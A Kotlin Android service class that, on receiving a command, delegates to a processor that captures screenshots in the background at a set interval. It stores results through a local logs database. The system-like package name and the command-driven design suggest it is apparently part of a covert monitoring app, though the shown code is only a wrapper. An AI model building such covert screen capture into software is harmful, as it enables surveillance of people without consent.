package com.android.services.services.screenshot


import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

/**
 * [ScreenShotCommandService] is a Service to capture the Screenshot in a background Service,
 * This service receives a Command to start capturing screenshots, and captures every Screenshot
 * after a specified Interval defined in Screenshot Command
 */

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class ScreenShotCommandService : Service() {

    // LocalDatabase Source
    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope

    // [IBackgroundProcessing] Interface
    lateinit var screenShotProcessingI: IBackgroundProcessing

    override fun onBind(arg0: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        screenShotProcessingI =
            ScreenShotCommandProcessingImplI(this, localDatabaseSource, coroutineScope)
        screenShotProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return screenShotProcessingI.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        screenShotProcessingI.onDestroy()
    }
}